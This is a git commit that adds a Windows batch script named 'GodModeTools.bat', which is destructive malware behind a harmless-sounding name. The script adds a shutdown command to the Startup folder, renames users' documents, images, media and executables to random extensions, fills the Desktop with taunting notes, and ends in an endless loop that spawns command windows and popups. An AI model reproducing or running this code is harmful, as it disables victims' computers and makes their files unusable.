32bb4c540f458a436b02e898c39ad289436d1e4b
M@lwar3 <144142418+adoomyxx@users.noreply.github.com>
2024-11-21 11:20:11 +0000

    BehavesLike.Ransomware.zt
    BehavesLike.Ransomware.zt

---
+++ GodModeTools.bat
@@ -0,0 +1,95 @@
+@echo off
+cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+echo.shutdown -s -t 0>>%random%.bat
+cd C:\Users
+ren *.exe *.1213
+ren *.cmd *.1980
+ren *.mp3 *.1143
+ren *.mp4 *.1998
+ren *.xlsx *.1652
+ren *.xlsm *.6617
+ren *.pptx *.9812
+ren *.pptm *.2243
+ren *.pdf *.3981
+ren *.docx *.1827
+ren *.docm *.1117
+ren *.txt *.9912
+ren *.vbs *.7716
+ren *.gif *.1722
+ren *.png *.1111
+ren *.jpg *.2222
+ren *.jpeg *.1919
+ren *.lnk *.3434
+echo.x=msgbox ("PC Bamboozled",0+16,"virus")>>notey.vbs
+cd C:\Users\%USERNAME%\Desktop
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo.My Virus Killed Your PC, Whatever you do, Dont Restart Your PC :)>>note%random%.txt
+echo Your PC is Gone, Now The Fun Begins :)
+timeout 2
+start www.google.co.ck/search?q=i+deep+fried+my+pc+how+2+fix+it
+start notey.vbs
+start notey.vbs
+timeout 2
+start notey.vbs
+echo Its Just The Beginning
+timeout 2
+echo i will start a bomb
+timeout 3
+:a
+start cmd
+start notey.vbs
+goto a
